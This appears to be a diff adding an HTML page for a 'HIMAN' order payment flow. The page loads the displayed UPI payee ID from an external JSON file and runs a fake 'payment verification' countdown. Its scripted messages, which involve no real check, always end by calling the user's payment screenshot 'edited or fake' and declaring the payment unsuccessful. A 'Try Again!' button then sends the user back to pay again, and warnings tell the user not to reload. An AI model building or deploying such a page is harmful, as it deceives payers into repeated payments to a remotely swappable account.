@@ -1,0 +1,412 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+<title>Order Confirmation Process</title>
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CF10YXPBE6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CF10YXPBE6');
+</script>
+<link rel="apple-touch-icon" sizes="57x57" href="/Cloud/Ficons/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/Cloud/Ficons/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/Cloud/Ficons/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/Cloud/Ficons/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/Cloud/Ficons/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/Cloud/Ficons/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/Cloud/Ficons/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/Cloud/Ficons/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/Cloud/Ficons/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="/Cloud/Ficons/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/Cloud/Ficons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/Cloud/Ficons/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/Cloud/Ficons/favicon-16x16.png">
+<link rel="manifest" href="/Cloud/Ficons/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/Cloud/Ficons/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+<link rel="stylesheet" type="text/css" href="styles/bootstrap.css">
+<link rel="stylesheet" type="text/css" href="styles/style.css">
+<link rel="stylesheet" type="text/css" href="styles/Loadin.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="fonts/css/fontawesome-all.min.css">    
+<link rel="manifest" href="_manifest.json" data-pwa-version="set_in_manifest_and_pwa_js">
+
+ <link rel="stylesheet" href="/Ac/Block.ccs">
+<script src="/Ac/Block.js"></script>
+ <script>
+    // Fetch UPI from external JSON
+    fetch('https://himanpayment2checkout.pages.dev/AccountCredential/UPI.json')
+      .then(response => response.text())
+      .then(text => {
+        const upi = text.replace(/^"(.*)"$/, '$1').trim();
+        document.getElementById("upi-display").textContent = upi;
+      })
+      .catch(error => {
+        console.error("Error fetching UPI:", error);
+        document.getElementById("upi-display").textContent = "Error loading";
+      });
+  </script>
+</head>
+    
+<body class="theme-light">
+    
+    <div id="loading-screen">
+        <div class="spinner"></div>
+        <div class="ex"></div> 
+    </div>
+    
+<div id="page">
+
+
+    <div class="header header-logo-center header-logo-center mb-4 bg-white shadow">
+        <a href="#" class="header-title"><img src="/styles/logo.svg" alt="logo" width="120" height="35"></a>
+    </div>
+    <style>
+        body {
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+          margin: 0;
+          padding: 0;
+          background: #f4f7f6;
+        }
+    
+        /* Overlay styles */
+        .overlay {
+          display: none;
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: rgba(0, 0, 0, 0.5);
+          justify-content: center;
+          align-items: center;
+          z-index: 1000;
+          opacity: 0;
+          transition: opacity 0.3s ease;
+        }
+    
+        /* Popup Styles (iOS style) */
+        .popup {
+          background: white;
+          padding: 20px;
+          border-radius: 12px;
+          text-align: center;
+          box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+          width: 80%;
+          max-width: 400px;
+          transform: translateY(-20px);
+          transition: transform 0.3s ease-in-out;
+        }
+    
+        .popup h2 {
+          margin: 0 0 20px 0;
+          font-size: 18px;
+          font-weight: bold;
+        }
+    
+        .popup button {
+          padding: 10px 20px;
+          margin: 10px;
+          font-size: 16px;
+          cursor: pointer;
+          border: none;
+          border-radius: 8px;
+          transition: background-color 0.3s;
+        }
+    
+        .popup button.yes {
+          background-color: #4CAF50;
+          color: white;
+        }
+    
+        .popup button.no {
+          background-color: #f44336;
+          color: white;
+        }
+    
+        .popup button:hover {
+          opacity: 0.9;
+        }
+    
+        /* Media Queries for Responsiveness */
+        @media (max-width: 600px) {
+          .popup {
+            width: 90%;
+            max-width: 300px;
+          }
+    
+          .popup h2 {
+            font-size: 16px;
+          }
+    
+          .popup button {
+            font-size: 14px;
+            padding: 8px 16px;
+          }
+        }
+      </style>
+    <style>
+       
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #message {
+            font-size: 24px;
+            line-height: 1.5;
+            color: dodgerblue;
+        }
+
+        h1 {
+            margin-top: 20px;
+            font-size: 24px;
+            color: red;
+        }
+    </style>
+
+  
+    
+    <style>
+        /* Basic reset and styles */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        /* Style for the generated ID box */
+        #container {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+        }
+
+        #generatedId {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        button {
+            background-color: #007aff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #005bb5;
+        }
+
+        /* iOS-style alert at the top */
+        #iosAlert {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: dodgerblue;
+            color: white;
+            margin-top: 12%;
+            font-size: 16px;
+            padding: 12px 20px;
+            text-align: center;
+            border-bottom-left-radius: 12px;
+            border-bottom-right-radius: 12px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: none;
+        }
+</style>
+ <style>
+        #statusMessage {
+            text-align: center;
+            color: green;
+            font-weight: bold;
+
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+
+        #statusMessage.visible {
+            opacity: 1;
+        }
+    </style>
+    <br><br>
+         <style>
+    .payment-warning {
+      color: red;
+      font-weight: bold;
+      font-family: sans-serif;
+    }
+  </style>
+        <div class="card card-style">
+
+                <div class="divider"></div>
+                <div class="list-group list-custom-large">
+
+                    <div class="card card-style bg-dark-light">
+                        <div class="content">
+                        <center> <h1 class="color-white">Progress</h1> </center>
+                        </div>
+                            <div class="card card-style ">
+                            <div class="content">
+                      
+                                <div class="container" id="content">
+                                    <img src="/rs/error.svg" alt="error" id="image" style="width: 80px; height: 80px;">
+                                    <div id="message"></div>
+                                    <div id="content"></div>
+                                  <center>
+    <span class="payment-warning">
+     Please ensure that the payment is made to : <span id="upi-display">searching...</span>
+    </span>
+  </center>
+                                </div>
+   <br> <center><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+	<circle cx="4" cy="12" r="3" fill="#35f407">
+		<animate id="svgSpinners3DotsScale0" attributeName="r" begin="0;svgSpinners3DotsScale1.end-0.25s" dur="0.75s" values="3;.2;3" />
+	</circle>
+	<circle cx="12" cy="12" r="3" fill="#35f407">
+		<animate attributeName="r" begin="svgSpinners3DotsScale0.end-0.6s" dur="0.75s" values="3;.2;3" />
+	</circle>
+	<circle cx="20" cy="12" r="3" fill="#35f407">
+		<animate id="svgSpinners3DotsScale1" attributeName="r" begin="svgSpinners3DotsScale0.end-0.45s" dur="0.75s" values="3;.2;3" />
+	</circle>
+</svg>
+ <span style="color: dodgerblue;">Live Payment Update</span>
+</center>
+     <div id="message"></div>
+    <div id="statusMessage"></div>
+    
+
+           <div class="divider"></div>
+
+           <div class="list-group list-custom-large">
+            <p><img src="/rs/No.svg" width="10px" height="10px">
+                <span style="color: #ff0404;"><b>Do not reload or refresh the webpage , otherwise payment will cancelled</b></span>
+            </p>
+            
+    
+
+      
+            
+            <p><img src="/rs/No.svg" width="10px" height="10px">
+                <span style="color: #ff0404;">If you have made the payment correctly, don't panic, just wait.</span>
+            </p>
+            
+
+
+            <p><img src="/rs/No.svg" width="10px" height="10px">
+                <span style="color: #ff0404;">Please do not close the browser or HIMAN apps from recent apps while payment verification is in progress.</span>
+            </p>
+            
+
+
+        
+            <div class="divider"></div>
+
+            </div>
+        </div>
+    </div>  
+    </div>                     
+           
+            </div>  
+        </div>
+        
+        <div data-menu-load="Copyright.html"><div class="card card-style">
+
+            </div>
+        </div></div>
+    
+</div>
+
+</div>
+</div>
+
+  <script>
+        let timeLeft = 241; // total time (seconds)
+        const total = timeLeft;
+        const messageElement = document.getElementById('message');
+        const contentElement = document.getElementById('content');
+        const statusMessage = document.getElementById('statusMessage');
+
+        const timerInterval = setInterval(() => {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const elapsed = ((total - timeLeft) / total) * 100;
+
+            // Update timer display
+            messageElement.innerHTML = `Payment Verification<br><center>${minutes}:${seconds < 10 ? '0' : ''}${seconds}</center>`;
+
+            // Determine message based on percentage of time passed
+            let message = '';
+            if (elapsed >= 0 && elapsed <= 5) {
+                message = 'Connecting to Account Department';
+            } else if (elapsed > 5 && elapsed <= 10) {
+                message = 'We Got Payment Screenshot & We shared it to account managers';
+            } else if (elapsed > 10 && elapsed <= 40) {
+                message = 'Account manager checking your screenshot';
+            } else if (elapsed > 40 && elapsed <= 60) {
+                message = 'Something is wrong in your screenshot';
+            } else if (elapsed > 60 && elapsed <= 65) {
+                message = 'Cross-checking your screenshot';
+            } else if (elapsed > 65 && elapsed <= 98) {
+                message = 'Another account manager checking your screenshot';
+            } else if (elapsed > 98 && elapsed < 100) {
+                message = 'We are sorry, this screenshot is completely edited or fake';
+            }
+
+            if (message) {
+                statusMessage.textContent = message;
+                statusMessage.classList.add('visible');
+            }
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+
+                // Clear status message
+                statusMessage.textContent = '';
+                statusMessage.classList.remove('visible');
+
+                // Show failure and button
+                contentElement.innerHTML = `
+                    <img src="/rs/info.svg" alt="Failure Image" style="width: 80px; height: 80px;">
+                    <h1>Sorry Payment<br>unsuccessful</h1>
+                    <a href="https://himanpayment2checkout.pages.dev/OrderID=9192Method=upi">
+                        <button class="btn btn-full btn-l rounded-s font-600 gradient-red" style="margin-top: 20px;">
+                            Try Again!
+                        </button>
+                    </a>
+                `;
+            }
+        }, 1000);
+    </script>
+
+
+
+<script type="text/javascript" src="scripts/bootstrap.min.js"></script>
+<script type="text/javascript" src="scripts/custom.js"></script>
+<script type="text/javascript" src="styles/loadin.js"></script>
+</body>
